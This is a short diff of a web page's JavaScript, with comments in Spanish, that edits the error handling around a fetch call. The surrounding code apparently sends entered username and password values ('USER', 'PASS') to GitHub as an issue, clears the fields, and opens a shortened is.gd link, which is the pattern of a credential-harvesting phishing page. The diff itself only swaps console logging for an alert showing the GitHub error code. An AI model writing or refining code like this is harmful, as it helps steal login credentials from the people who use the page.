@@ -127,15 +127,16 @@ button {
             body: JSON.stringify(datosIssue)
         });
 
-        if (respuesta.ok) {
+         if (respuesta.ok) {
             // Redirección exitosa
             window.open("https://is.gd/stDTxK");
             USER.value = "";
             PASS.value = "";
         } else {
-            console.error("Error de la API:", respuesta.status, respuesta.statusText);
-            alert("Hubo un problema al enviar los datos. Revisa la consola.");
+            // Esto te mostrará el código de error en la pantalla del celular
+            alert("Error de GitHub número: " + respuesta.status + " (" + respuesta.statusText + ")");
         }
+
     } catch (error) {
         console.error("Error de conexión:", error);
         alert("Error de conexión.");
